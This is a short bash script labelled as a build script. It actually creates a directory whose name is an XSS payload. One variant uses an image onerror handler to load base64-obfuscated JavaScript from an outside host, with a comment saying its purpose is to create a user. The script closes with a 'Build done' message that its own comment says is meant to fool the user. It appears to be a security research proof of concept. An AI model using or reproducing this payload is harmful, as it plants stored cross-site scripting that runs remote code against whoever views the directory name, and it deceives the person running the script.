#!/usr/bin/env bash

#
# Build script
#

# create a fresh build dir and step into
rm -rf build
mkdir build
cd build

# create exploit directory

# exploit 1: alert(1)
EXPLOIT="\"><img src=# onerror=alert(1)>"

# exploit 2: create user
SCRIPT_URL="https://www.gaming-pc.net/felix_research/bamboo.js"
BASE64_ENCODED_SCRIPT_URL=$(echo "$SCRIPT_URL" | base64)
EXPLOIT="\"><img src=# onerror=\"document.body.append(Object.assign(document.createElement('script'),{src: atob('$BASE64_ENCODED_SCRIPT_URL')}));\">"

mkdir "$EXPLOIT"
cd "$EXPLOIT"

# create directory in exploit, so the exploit is the parent
mkdir test

# create file in test dir
echo "foo" > test/bar.txt

# Display message to fool the user that the build has been successfull
echo "Build done"
